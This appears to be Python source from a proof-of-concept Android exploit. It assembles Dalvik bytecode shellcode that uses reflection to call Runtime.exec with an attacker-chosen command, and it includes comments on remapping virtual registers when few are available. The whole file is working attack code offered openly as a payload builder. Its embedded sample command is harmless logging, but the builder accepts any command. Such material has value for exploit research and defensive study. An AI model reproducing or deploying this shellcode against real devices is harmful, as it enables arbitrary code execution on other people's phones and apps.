from pwn import p8
from bcbuilder import BytecodeBuilder


class GenericCommandExecutionShellcode:

    def build_shellcode_stable(
        command: bytes,
        char_array_index: int,
        stringbuilder_index: int,
        stringbuilder_constructor_index: int,
        stringbuilder_append_chararray_index: int,
        getruntime_index: int,
        stringbuilder_tostring_index: int,
        object_getclass_index: int,
        classarray_index: int,
        string_index: int,
        class_getdeclaredmethod_index: int,
        objectarray_index: int,
        method_invoke_index: int,
        object_index: int,
        available_vregs: int) -> bytes:

        command_buffer = b''
        for c in command:
            command_buffer += p8(c) + b'\x00'

        # This shellcode needs exactly 10 vregs (may be reducible to 8 or 9, but not to 4).
        # Observe that vregs and vrefs are located next to each other. Therefore, if
        # only one vreg is available, i.e. v0, then v1 already points into r0, i.e. the
        # first vref that is parallel to v0. Similarly, if two vreg are available, then v2
        # points to r0. In general, the first overlap happens at v<N>, where N is the number
        # of available vregs. If we need e.g. 10 vregs, but only have 4 available, then
        # accesses to vregs v4 and above disrupt object references. Therefore, reinterpret
        # N as the block size for vreg registers. To handle accesses to v<N> and above, use
        # that v<N+N> is again a "free" region in terms of vregs and vrefs. Going even further,
        # to account for $M$ vregs, determine $k = M // N$ as the number of blocks. The remainder
        # is $l = M % N$. For an access to v<i> where $i < N$, proceed as usual, i.e. with v<i>.
        # If $i >= N$, then determine the block v<i> should live in as $k = i // N$ and the offset
        # within the block as $l = i % N$, which yields v<k * N * 2 + l>. The overall formula for
        # accessing a vreg in shellcode is thus: v<(i // N) * N * 2 + (i % N)>. This naturally works
        # in case $i < N$, which yields v<0 * N * 2 + i = i>. The block size is N * 2, because vregs
        # and vregs each take up N indices.

        v = lambda i: (i // available_vregs) * (2 * available_vregs) + (i % available_vregs)
        num_vregs = 10


        # Using below shellcode requires vreg indices to be within [0,...,255], if not worse.
        for i in range(num_vregs):
            assert ((v(i) & (2**8 - 1)) == v(i))

        v0 = v(0)
        v1 = v(1)
        v2 = v(2)
        v3 = v(3)
        v4 = v(4)
        v5 = v(5)
        v6 = v(6)
        v7 = v(7)
        v8 = v(8)
        v9 = v(9)

        builder = BytecodeBuilder(type_map={
            'char[]': char_array_index,
            'StringBuilder': stringbuilder_index,
            'Class[]': classarray_index,
            'String': string_index,
            'Object[]': objectarray_index,
            'Object': object_index,
        })

# [Index = 0x5, Offset = 0x31c, Num Regs = 0xa]: private static void com/poc/shellcode/MainActivity::shellcode()
        return (builder
# 0000: 13 00 12 00       CONST_16 v0, #+18
            .const_16(v0, len(command))
# 0004: 23 00 13 00       NEW_ARRAY v0, v0, TYPE:[C
            .new_array(v0, v0, 'char[]')
# 0008: 26 00 3e 00 00 00 FILL_ARRAY_DATA v0, +62
            .fill_array_data(v0, 65)
# 000e: 22 01 0d 00       NEW_INSTANCE v1, TYPE:Ljava/lang/StringBuilder;
            .new_instance(v1, 'StringBuilder')
# 0012: 70 10 0b 00 01 00 INVOKE_DIRECT {v1}, METHOD:Ljava/lang/StringBuilder;-><init>()V
            .invoke_direct(1, stringbuilder_constructor_index, [v1])
# 0018: 6e 20 0c 00 01 00 INVOKE_VIRTUAL {v1, v0}, METHOD:Ljava/lang/StringBuilder;->append([C)Ljava/lang/StringBuilder;
            .invoke_virtual(2, stringbuilder_append_chararray_index, [v1, v0])
# 001e: 12 42             CONST_4 v2, #+4
            .const_16(v2, 4)
# 0020: 23 22 13 00       NEW_ARRAY v2, v2, TYPE:[C
            .new_array(v2, v2, 'char[]')
# 0024: 26 02 46 00 00 00 FILL_ARRAY_DATA v2, +70
            .fill_array_data(v2, 65)
# 002a: 22 03 0d 00       NEW_INSTANCE v3, TYPE:Ljava/lang/StringBuilder;
            .new_instance(v3, 'StringBuilder')
# 002e: 70 10 0b 00 03 00 INVOKE_DIRECT {v3}, METHOD:Ljava/lang/StringBuilder;-><init>()V
            .invoke_direct(1, stringbuilder_constructor_index, [v3])
# 0034: 6e 20 0c 00 23 00 INVOKE_VIRTUAL {v3, v2}, METHOD:Ljava/lang/StringBuilder;->append([C)Ljava/lang/StringBuilder;
            .invoke_virtual(2, stringbuilder_append_chararray_index, [v3, v2])
# 003a: 71 00 09 00 00 00 INVOKE_STATIC {}, METHOD:Ljava/lang/Runtime;->getRuntime()Ljava/lang/Runtime;
            .invoke_static(0, getruntime_index, [])
# 0040: 0c 04             MOVE_RESULT_OBJECT v4
            .move_result_object(v4)
# 0042: 6e 10 08 00 04 00 INVOKE_VIRTUAL {v4}, METHOD:Ljava/lang/Object;->getClass()Ljava/lang/Class;
            .invoke_virtual(1, object_getclass_index, [v4])
# 0048: 0c 05             MOVE_RESULT_OBJECT v5
            .move_result_object(v5)
# 004a: 6e 10 0d 00 03 00 INVOKE_VIRTUAL {v3}, METHOD:Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
            .invoke_virtual(1, stringbuilder_tostring_index, [v3])
# 0050: 0c 06             MOVE_RESULT_OBJECT v6
            .move_result_object(v6)
# 0052: 12 17             CONST_4 v7, #+1
            .const_16(v7, 1)
# 0054: 23 77 14 00       NEW_ARRAY v7, v7, TYPE:[Ljava/lang/Class;
            .new_array(v7, v7, 'Class[]')
# 0058: 12 08             CONST_4 v8, #+0
            .const_16(v8, 0)
# 005a: 1c 09 0c 00       CONST_CLASS v9, TYPE:Ljava/lang/String;
            .const_class(v9, 'String')
# 005e: 4d 09 07 08       APUT_OBJECT v9, v7, v8
            .aput_object(v9, v7, v8)
# 0062: 6e 30 07 00 65 07 INVOKE_VIRTUAL {v5, v6, v7}, METHOD:Ljava/lang/Class;->getDeclaredMethod(Ljava/lang/String;,[Ljava/lang/Class;)Ljava/lang/reflect/Method;
            .invoke_virtual(3, class_getdeclaredmethod_index, [v5, v6, v7])
# 0068: 0c 05             MOVE_RESULT_OBJECT v5
            .move_result_object(v5)
# 006a: 6e 10 0d 00 01 00 INVOKE_VIRTUAL {v1}, METHOD:Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
            .invoke_virtual(1, stringbuilder_tostring_index, [v1])
# 0070: 0c 06             MOVE_RESULT_OBJECT v6
            .move_result_object(v6)
# 0072: 24 10 15 00 06 00 FILLED_NEW_ARRAY {v6}, TYPE:[Ljava/lang/Object;
            .filled_new_array(1, 'Object[]', [v6])
# 0078: 0c 06             MOVE_RESULT_OBJECT v6
            .move_result_object(v6)
# 007a: 6e 30 0f 00 45 06 INVOKE_VIRTUAL {v5, v4, v6}, METHOD:Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;,[Ljava/lang/Object;)Ljava/lang/Object;
            .invoke_virtual(3, method_invoke_index, [v5, v4, v6])
# 0080: 0e 00             RETURN_VOID 
            .return_void()
# 0082: 00 00             NOP 
            .nop()
# 0084: ARRAY_PAYLOAD Array@{108, 111, 103, 32, 34, 104, 101, 108, 108, 111, 32, 116, 104, 101, 114, 101, 33, 34}
            .array_payload(2, len(command), command_buffer)
# 00b0: ARRAY_PAYLOAD Array@{101, 120, 101, 99}
            .array_payload(2, 4, b'e\x00x\x00e\x00c\x00')).build()

